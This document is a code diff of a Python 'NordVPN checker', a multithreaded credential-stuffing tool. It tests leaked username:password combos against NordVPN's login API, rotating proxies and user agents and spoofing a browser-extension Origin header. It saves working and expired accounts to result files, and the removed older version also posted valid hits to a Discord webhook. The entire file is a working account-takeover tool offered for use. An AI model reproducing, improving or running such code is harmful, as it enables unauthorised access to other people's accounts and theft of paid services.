@@ -1,195 +1,118 @@
-from colorama import init,Fore,Style
-from os import name,system
-from sys import stdout
-from random import choice
-from threading import Thread,Lock,active_count
+import json
+from helpers import _clear,_setTitle,_printText,_readFile,_getCurrentTime,_getRandomUserAgent,_getRandomProxy,colors
+from threading import Thread,active_count, current_thread
 from time import sleep
 from datetime import datetime
 import requests
-import json
 
 class Main:
-    def clear(self):
-        if name == 'posix':
-            system('clear')
-        elif name in ('ce', 'nt', 'dos'):
-            system('cls')
-        else:
-            print("\n") * 120
-
-    def SetTitle(self,title:str):
-        if name == 'posix':
-            stdout.write(f"\x1b]2;{title}\x07")
-        elif name in ('ce', 'nt', 'dos'):
-            system(f'title {title}')
-        else:
-            stdout.write(f"\x1b]2;{title}\x07")
-
-    def PrintText(self,bracket_color:Fore,text_in_bracket_color:Fore,text_in_bracket,text):
-        self.lock.acquire()
-        stdout.flush()
-        text = text.encode('ascii','replace').decode()
-        stdout.write(Style.BRIGHT+bracket_color+'['+text_in_bracket_color+text_in_bracket+bracket_color+'] '+bracket_color+text+'\n')
-        self.lock.release()
-
-    def ReadFile(self,filename,method):
-        with open(filename,method,encoding='utf8') as f:
-            content = [line.strip('\n') for line in f]
-            return content
-
-    def ReadJson(self,filename,method):
-        with open(filename,method) as f:
-            return json.load(f)
-
-    def GetRandomUserAgent(self):
-        useragents = self.ReadFile('[Data]/useragents.txt','r')
-        return choice(useragents)
-
-    def GetRandomProxy(self):
-        proxies_file = self.ReadFile('[Data]/proxies.txt','r')
-        proxies = {}
-        if self.proxy_type == 1:
-            proxies = {
-                "http":"http://{0}".format(choice(proxies_file)),
-                "https":"https://{0}".format(choice(proxies_file))
-            }
-        elif self.proxy_type == 2:
-            proxies = {
-                "http":"socks4://{0}".format(choice(proxies_file)),
-                "https":"socks4://{0}".format(choice(proxies_file))
-            }
-        else:
-            proxies = {
-                "http":"socks5://{0}".format(choice(proxies_file)),
-                "https":"socks5://{0}".format(choice(proxies_file))
-            }
-        return proxies
-
-    def TitleUpdate(self):
-        while True:
-            self.SetTitle(f'[One Man Builds NordVPN Checker Tool] ^| HITS: {self.hits} ^| BADS: {self.bads} ^| WEBHOOK RETRIES: {self.webhook_retries} ^| RETRIES: {self.retries} ^| THREADS: {active_count()-1}')
-            sleep(0.1)
-
-    def __init__(self):
-        init(convert=True)
-        self.SetTitle('[One Man Builds NordVPN Checker Tool]')
-        self.clear()
-        self.title = Style.BRIGHT+Fore.GREEN+"""                                        
-                                  ╔═════════════════════════════════════════════════╗    
-                                     ╔╗╔╔═╗╦═╗╔╦╗╦  ╦╔═╗╔╗╔  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
-                                     ║║║║ ║╠╦╝ ║║╚╗╔╝╠═╝║║║  ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
-                                     ╝╚╝╚═╝╩╚══╩╝ ╚╝ ╩  ╝╚╝  ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═
-                                  ╚═════════════════════════════════════════════════╝
-
-                
+    def __init__(self) -> None:
+        _setTitle('[NordVPN]')
+        _clear()
+        title = colors['bcyan']+"""
+                          ╔═════════════════════════════════════════════════════════════════════════╗
+                            $$\   $$\                           $$\ $$\    $$\ $$$$$$$\  $$\   $$\ 
+                            $$$\  $$ |                          $$ |$$ |   $$ |$$  __$$\ $$$\  $$ |
+                            $$$$\ $$ | $$$$$$\   $$$$$$\   $$$$$$$ |$$ |   $$ |$$ |  $$ |$$$$\ $$ |
+                            $$ $$\$$ |$$  __$$\ $$  __$$\ $$  __$$ |\$$\  $$  |$$$$$$$  |$$ $$\$$ |
+                            $$ \$$$$ |$$ /  $$ |$$ |  \__|$$ /  $$ | \$$\$$  / $$  ____/ $$ \$$$$ |
+                            $$ |\$$$ |$$ |  $$ |$$ |      $$ |  $$ |  \$$$  /  $$ |      $$ |\$$$ |
+                            $$ | \$$ |\$$$$$$  |$$ |      \$$$$$$$ |   \$  /   $$ |      $$ | \$$ |
+                            \__|  \__| \______/ \__|       \_______|    \_/    \__|      \__|  \__|
+                          ╚═════════════════════════════════════════════════════════════════════════╝
         """
-        print(self.title)
-        self.hits = 0
-        self.bads = 0
+        print(title)
+        self.stop_thread = False
+
+        self.hit = 0
+        self.bad = 0
+        self.expired = 0
         self.retries = 0
-        self.webhook_retries = 0
-        self.lock = Lock()
 
-        config = self.ReadJson('[Data]/configs.json','r')
+        self.use_proxy = int(input(f'{colors["bcyan"]}[>] {colors["yellow"]}[1]Proxy/[2]Proxyless:{colors["bcyan"]} '))
+        self.proxy_type = None
 
-        self.use_proxy = config['use_proxy']
-        self.proxy_type = config['proxy_type']
-        self.threads_num = config['threads']
-        self.webhook_enable = config['webhook_enable']
-        self.webhook_url = config['webhook_url']
+        if self.use_proxy == 1:
+            self.proxy_type = int(input(f'{colors["bcyan"]}[>] {colors["yellow"]}[1]Https/[2]Socks4/[3]Socks5:{colors["bcyan"]} '))
 
+        self.threads = int(input(f'{colors["bcyan"]}[>] {colors["yellow"]}Threads:{colors["bcyan"]} '))
+        self.session = requests.session()
         print('')
 
-    def SendWebhook(self,title,message,icon_url,thumbnail_url,proxy,useragent):
+    def _titleUpdate(self):
+        while True:
+            _setTitle(f'[NordVPN] ^| HITS: {self.hit} ^| BAD: {self.bad} ^| EXPIRED: {self.expired} ^| RETRIES: {self.retries}')
+            sleep(0.4)
+            if self.stop_thread == True:
+                break
+
+    def _check(self,user,password):
+        useragent = _getRandomUserAgent('useragents.txt')
+        headers = {'User-Agent':useragent,'Content-Type':'application/json','Host':'api.nordvpn.com','Accept':'application/json','DNT':'1','Origin':'chrome-extension://fjoaledfpmneenckfbpdfhkmimnjocfa'}
+        proxy = _getRandomProxy(self.use_proxy,self.proxy_type,'proxies.txt')
+        payload = {'username':user,'password':password}
         try:
-            timestamp = str(datetime.utcnow())
+            response = self.session.post('https://api.nordvpn.com/v1/users/tokens',json=payload,proxies=proxy,headers=headers)
 
-            message_to_send = {"embeds": [{"title": title,"description": message,"color": 65362,"author": {"name": "AUTHOR'S DISCORD SERVER [CLICK HERE]","url": "https://discord.gg/9bHfzyCjPQ","icon_url": icon_url},"footer": {"text": "MADE BY ONEMANBUILDS","icon_url": icon_url},"thumbnail": {"url": thumbnail_url},"timestamp": timestamp}]}
-            
-            headers = {
-                'User-Agent':useragent,
-                'Pragma':'no-cache',
-                'Accept':'*/*',
-                'Content-Type':'application/json'
-            }
-
-            payload = json.dumps(message_to_send)
-
-            if self.use_proxy == 1:
-                response = requests.post(self.webhook_url,data=payload,headers=headers,proxies=proxy)
-            else:
-                response = requests.post(self.webhook_url,data=payload,headers=headers)
-
-            if response.text == "":
-                pass
-            elif "You are being rate limited." in response.text:
-                self.webhook_retries += 1
-                self.SendWebhook(title,message,icon_url,thumbnail_url,proxy,useragent)
-            else:
-                self.webhook_retries += 1
-                self.SendWebhook(title,message,icon_url,thumbnail_url,proxy,useragent)
-        except:
-            self.webhook_retries += 1
-            self.SendWebhook(title,message,icon_url,thumbnail_url,proxy,useragent)
-
-    def NordVPN(self,username,password):
-        try:
-            session = requests.session()
-            link = 'https://api.nordvpn.com/v1/users/tokens'
-            json_payload = {}
-            json_payload['username'] = username
-            json_payload['password'] = password
-
-            useragent = self.GetRandomUserAgent()
-
-            headers = {
-                'User-Agent':useragent,
-                'Content-Type':'application/json',
-                'Accept':'*/*',
-                'Accept-Encoding':'gzip, deflate, br',
-                'Connection':'keep-alive'
-            }
-            response = ''
-            proxy = ''
-
-            if self.use_proxy == 1:
-                proxy = self.GetRandomProxy()
-                response = session.post(link,headers=headers,json=json_payload,proxies=proxy)
-            else:
-                response = session.post(link,headers=headers,json=json_payload)
-
-            if 'Unauthorized' in response.text:
-                self.PrintText(Fore.WHITE,Fore.RED,'BAD',f'{username}:{password}')
-                with open('[Data]/[Results]/bads.txt','a',encoding='utf8') as f:
-                    f.write(f'{username}:{password}\n')
-                self.bads += 1
+            if "'code': 100103" in response.text:
+                self.bad += 1
+                _printText(colors['bcyan'],colors['red'],'BAD',f'{user}:{password}')
+                with open('[Results]/bads.txt','a',encoding='utf8') as f:
+                    f.write(f'{user}:{password}\n')
+            elif "'code': 101301" in response.text:
+                self.bad += 1
+                _printText(colors['bcyan'],colors['red'],'BAD',f'{user}:{password}')
+                with open('[Results]/bads.txt','a',encoding='utf8') as f:
+                    f.write(f'{user}:{password}\n')
             elif 'user_id' in response.text:
-                self.PrintText(Fore.WHITE,Fore.GREEN,'HIT',f'{username}:{password}')
-                with open('[Data]/[Results]/hits.txt','a',encoding='utf8') as f:
-                    f.write(f'{username}:{password}\n')
-                self.hits += 1
-                if self.webhook_enable == 1:
-                    self.SendWebhook('NordVPN Account',f'{username}:{password}','https://cdn.discordapp.com/attachments/776819723731206164/796935218166497352/onemanbuilds_new_logo_final.png','https://lh3.googleusercontent.com/proxy/pEluNoEqqFVb9B4dYd620hQ0wFutQuFYIPPJk97xsjCGCi6z88s2WTNkZCvix5D_4MDJDzAw380enwZOnFY1OhNndJ3qOXaLJj11GDTqKuiiY3zrXxvuusonYp_uPxiV4bsNekWYSTZszw',proxy,useragent)
+                expires_at = response.json()['expires_at']
+                expires_at = datetime.strptime(expires_at,"%Y-%m-%d %H:%M:%S")
+                curr_time = datetime.strptime(_getCurrentTime(),"%Y-%m-%d %H:%M:%S")
+                if expires_at < curr_time:
+                    self.expired += 1
+                    _printText(colors['bcyan'],colors['red'],'EXPIRED',f'{user}:{password} [{expires_at}]')
+                    with open('[Results]/expireds.txt','a',encoding='utf8') as f:
+                        f.write(f'{user}:{password} [{str(expires_at)}\n')
+                else:
+                    self.hit += 1
+                    _printText(colors['bcyan'],colors['green'],'HIT',f'{user}:{password} [{expires_at}]')
+                    with open('[Results]/hits.txt','a',encoding='utf8') as f:
+                        f.write(f'{user}:{password}\n')
+                    with open('[Results]/detailed_hits.txt','a',encoding='utf8') as f:
+                        f.write(f'{user}:{password} [{str(expires_at)}]\n')
+            elif '429 Too Many Requests' in response.text:
+                self.retries += 1
+                self._check(user,password)
             else:
                 self.retries += 1
-                self.NordVPN(username,password)
-        except:
+                self._check(user,password)
+        except Exception:
             self.retries += 1
-            self.NordVPN(username,password)
+            self._check(user,password)
 
-    def Start(self):
-        Thread(target=self.TitleUpdate).start()
-        combos = self.ReadFile('[Data]/combos.txt','r')
+    def _start(self):
+        combos = _readFile('combos.txt','r')
+        t = Thread(target=self._titleUpdate)
+        t.start()
+        threads = []
         for combo in combos:
-            Run = True
-            username = combo.split(':')[0]
-            password = combo.split(':')[-1]
+            run = True
+            
+            user = combo.split(':')[0]
+            password = combo.split(':')[1]
 
-            while Run:
-                if active_count()<=self.threads_num:
-                    Thread(target=self.NordVPN,args=(username,password)).start()
-                    Run = False
+            while run:
+                if active_count()<=self.threads:
+                    thread = Thread(target=self._check,args=(user,password))
+                    threads.append(thread)
+                    thread.start()
+                    run = False
+
+        for x in threads:
+            x.join()
+
+        print('')
+        _printText(colors['bcyan'],colors['yellow'],'FINISHED','Process done!')
 
 if __name__ == '__main__':
-    main = Main()
-    main.Start()
+    Main()._start()
